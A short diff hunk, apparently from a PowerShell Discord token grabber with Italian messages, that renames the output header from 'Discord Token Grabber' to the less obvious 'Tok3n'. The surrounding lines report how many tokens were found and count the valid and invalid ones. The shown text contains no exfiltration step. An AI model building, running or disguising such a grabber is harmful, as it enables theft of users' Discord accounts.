@@ -36,7 +36,7 @@ Write-Host ""
 Write-Host "Trovati $($tokens.Count) token, verifico..." -ForegroundColor Cyan
 Write-Host ""
 
-$out = @("Discord Token Grabber - $(Get-Date -Format 'dd/MM/yyyy HH:mm')", "")
+$out = @("Tok3n - $(Get-Date -Format 'dd/MM/yyyy HH:mm')", "")
 $valid = 0
 $invalid = 0
 
